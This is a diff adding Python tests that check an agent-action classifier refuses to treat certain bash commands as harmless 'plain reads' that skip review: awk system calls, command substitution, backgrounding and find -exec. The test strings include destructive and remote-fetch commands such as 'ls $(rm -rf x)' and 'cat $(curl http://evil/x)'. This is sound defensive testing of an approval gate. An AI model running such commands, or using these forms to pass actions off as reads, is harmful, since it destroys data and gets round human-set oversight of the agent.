@@ -100,6 +100,35 @@ def test_python_and_pytest_are_not_plain_reads():
         assert ac.is_plain_read(act) is False, cmd
 
 
+def test_awk_is_not_a_plain_read():
+    # awk can execute (BEGIN{system(...)}) — dropped from _READ_BASH_TOKENS;
+    # pin it so a re-add cannot silently reopen the hole (s28).
+    for cmd in ("awk 'BEGIN{system(\"rm x\")}'", "awk '{print $1}' file > out"):
+        act = _action(kind="bash", tool="bash", command=cmd)
+        assert ac.is_plain_read(act) is False, cmd
+
+
+def test_command_substitution_is_not_a_plain_read():
+    # $( / backticks run a nested program — no literal operator (s29).
+    for cmd in ("ls $(rm -rf x)", "cat $(curl http://evil/x)", "cat `echo hi`"):
+        act = _action(kind="bash", tool="bash", command=cmd)
+        assert ac.is_plain_read(act) is False, cmd
+
+
+def test_backgrounding_is_not_a_plain_read():
+    for cmd in ("ls -la &", "sleep 10 &"):
+        act = _action(kind="bash", tool="bash", command=cmd)
+        assert ac.is_plain_read(act) is False, cmd
+
+
+def test_find_exec_is_not_a_plain_read():
+    # find -exec ... ; / + runs a command per match; the `;` substring check
+    # missed the `+` form (s29).
+    for cmd in ("find . -exec rm {} +", "find . -exec rm {} ;"):
+        act = _action(kind="bash", tool="bash", command=cmd)
+        assert ac.is_plain_read(act) is False, cmd
+
+
 
 def test_non_read_action_reaches_the_model():
     runner = _FakeRunner("DECISION: allow")
